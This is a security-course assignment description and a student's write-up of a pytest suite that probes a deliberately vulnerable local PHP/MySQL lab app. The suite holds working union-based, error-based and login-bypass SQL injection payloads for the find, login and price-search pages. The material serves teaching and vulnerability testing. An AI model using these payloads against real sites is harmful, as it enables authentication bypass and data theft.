# DESCRIPTION

In this assignment, you will build a new test suite that tests the target application for Union-based SQL Injections, similar to the one you built in Assignment 1.

While in Assignment 1 you could use plain Python for your test suite, for this assignment you will use pytest to organize and run your tests steps.

This is very similar to using plain Python: you can create tests as simple Python functions, but the name of the function must always start with "test_". 

Also, these functions should be in a Python file, which must also have a name that starts with "test_".

If you structure your code like this, you should only need to install pytest (pip install pytest) and run the "pytest" command from the folder that contains these files. 

Tests will be automatically run.

Here is an example of a simple pytest file:

    def test_this_always_succeeds():
        assert True

    def test_this_always_fails():
        assert False

    def test_succeeds_implicitly():
        # logic here
        pass

Notice that you can "assert False" if you want to make the test fail, but you can have implicit success for tests (or you can also specify "assert True")

# Environment Setup

If you haven't done it already, you should set up a local MySQL server.
You can follow the guides I shared on AulaWeb for that.
Then, download the archive that contains all the environment files.

Once you set up the environment, change the credentials from the mysql_credentials.php file to the ones you are using

    $mysql_server = "localhost"; // or any host on which you deployed it
    $mysql_user = "root";
    $mysql_pass = "MyCoolPassword1!"; // The password you set up during installation

You can now populate your MySQL instance using the .sql files in the setup folder. For example, you can run the following commands:

    $ cd setup
    $ mysql -u root -p < create-database.sql
    $ mysql -u root -p fstt23_assignment < create-users.sql
    $ mysql -u root -p fstt23_assignment < create-items.sql

Once the MySQL server is set up, you can run the target environment.

WARNING: due to how the built-in server and the MySQL modules work, you will need to run the following command, instead of the usual one

    php -d "display_errors=1" -S localhost:4000

Alternatively, you can add the following line at the beginning of every PHP file in the target:
    ini_set('display_errors', 1); 
    
# Testing

For each page of the target application, you should design and implement a test step that checks:

- if the page is working correctly (e.g., for login pages, that the login is working correctly)
- if the page is vulnerable to SQL injection.

In particular, you should test the page for Union-based and Error-based SQL Injections (but you can also have additional steps, if you want).
Tests should take into account all possible variants of syntax and insufficient sanitization that could be applied to the page.

Confirmation step
One easy way to confirm that the attack was successful is to retrieve the MySQL version via the VERSION() SQL function, or the user for the current connection, which can be retrieved via the USER() function. Of course, you can use any other value you prefer to confirm the exploit.

## Conclusions

This test suite produce requests in GET and POST to all the pages reported in this directory.

The test for find pages reported in the following, produce us the visualization of SQL injection on a find page for an item stored in a database attacking the search GET param.:

    @pytest.mark.parametrize("url, payload", [
        ("/find.php", "' OR 1=1 LIMIT 1 OFFSET 0; -- -"),
        ("/find.php", "' UNION SELECT VERSION(), USER() -- -"),
        ("/find.php", "' UNION ALL SELECT name AS NameOfItem, price AS Price FROM fstt23_assignment.items -- -"),
        ("/find.php", "' AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -"),
        ("/find3.php", "' OR 1=1 LIMIT 1 OFFSET 0; -- -"),
        ("/find3.php", "' UNION SELECT VERSION(), USER() -- -"),
        ("/find3.php", "' UNION ALL SELECT name AS NameOfItem, price AS Price FROM fstt23_assignment.items -- -"),
        ("/find3.php", "' AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -"),
        ("/find2.php", '" OR 1=1 LIMIT 1 OFFSET 0; -- -'),
        ("/find2.php", '" UNION SELECT VERSION(), USER() -- -'),
        ("/find2.php", '" UNION ALL SELECT name AS NameOfItem, price AS Price FROM fstt23_assignment.items -- -'),
        ("/find2.php", '" AND ExtractValue(0, CONCAT( 0x5c, User() ) ) -- -'),
    ])
    def test_find_pages(base_url, url, payload):
        response = requests.get(base_url + url, params={"search": payload})
        assert "error in your SQL syntax" not in response.text
        assert any(keyword in response.text for keyword in ["Apple", "8.0.32", "root", "172.17.0.1"])


In this way we are able to see all the injections that makes us find an Item from the database and which one fails in this goal.

Moreover the test suite for the login pages perform POST requests and we want to see if we are able to inject well and not retrieve the message "Wrong username or password"

    @pytest.mark.parametrize("url, payload", [
        ("/login.php", {"user": "admin' -- -", "pass": "anything"}),
        ("/login.php", {"user": "anything", "pass": "any' OR 'a'='a"}),
        ("/login.php", {"user": "anything", "pass": "any' OR True LIMIT 2,1 -- -"}),
        ("/login2.php", {"user": "admin' -- -", "pass": "anything"}),
        ("/login2.php", {"user": "admin", "pass": "any' OR 'a'='a"}),
        ("/login2.php", {"user": "anything", "pass": "any' OR True LIMIT 2,1 -- -"}),
        ("/login3.php", {"user": "admin' -- -", "pass": "anything"}),
        ("/login3.php", {"user": "anything", "pass": "a' OR 'b'='b"}),
        ("/login3.php", {"user": "anything", "pass": "a' OR True LIMIT 2,1 -- -"}),
    ])
    def test_login_pages(base_url, url, payload):
        response = requests.post(base_url + url, data=payload)
        assert "Wrong username or password" not in response.text

In this case we can see that the login pages have fixed the user param so we can't attacking the db using the user param but we need to focus more on the password parameter that only in the login3.php page is sanitized and so we can't be able to perform any attack on that particular page as we can see from the pytest output.

Now we can move to the search_by_price pages that are similar to the find pages but in this case we are attacking a parameter that serves only for a comparison in the query so its a little bit different to organize and performs the tests:

    @pytest.mark.parametrize("url, payload", [
        ("/search_by_price.php", {"max": "0 OR 1=1 LIMIT 1 OFFSET 0; -- -"}),
        ("/search_by_price.php", {"max": "0 UNION ALL SELECT name, price FROM fstt23_assignment.items -- -"}),
        ("/search_by_price.php", {"max": "0 UNION SELECT VERSION(), USER() -- -"}),
        ("/search_by_price2.php", {"max": "0 OR 1=1 LIMIT 1 OFFSET 0; -- -"}),
        ("/search_by_price2.php", {"max": "0 UNION ALL SELECT name, price FROM fstt23_assignment.items -- -"}),
        ("/search_by_price2.php", {"max": "0 UNION SELECT VERSION(), USER() -- -"}),
        ("/search_by_price3.php", {"max": "0 OR 1=1 LIMIT 1 OFFSET 0; -- -"}),
        ("/search_by_price3.php", {"max": "0 UNION ALL SELECT name, price FROM fstt23_assignment.items -- -"}),
        ("/search_by_price3.php", {"max": "0 UNION SELECT VERSION(), USER() -- -"}),
        ("/search_by_price4.php", {"max": "0 OR 1=1 LIMIT 1 OFFSET 0; -- -"}),
        ("/search_by_price4.php", {"max": "0 UNION ALL SELECT name, price FROM fstt23_assignment.items -- -"}),
        ("/search_by_price4.php", {"max": "0 UNION SELECT VERSION(), USER() -- -"})
    ])
    def test_search_by_price_pages(base_url, url, payload):
        response = requests.get(base_url + url, params=payload)
        assert "error in your SQL syntax" not in response.text
        assert any(keyword in response.text for keyword in ["Apple", "8.0.32", "root", "172.17.0.1", "2."])

In this case we can notice that all the injection have success even if we don't know the price we are able to find and display all the items/prices of the items stored in the database. In this way, utilizing those SQL injections as Payload of the max parameter even if we have real_escape_string we are able to "attack the database".

All the error based injections are blocked and avoided because the error is thrown out when preparing the query directly in the terminal of the mysql database so it is not displayed into the pages in this way.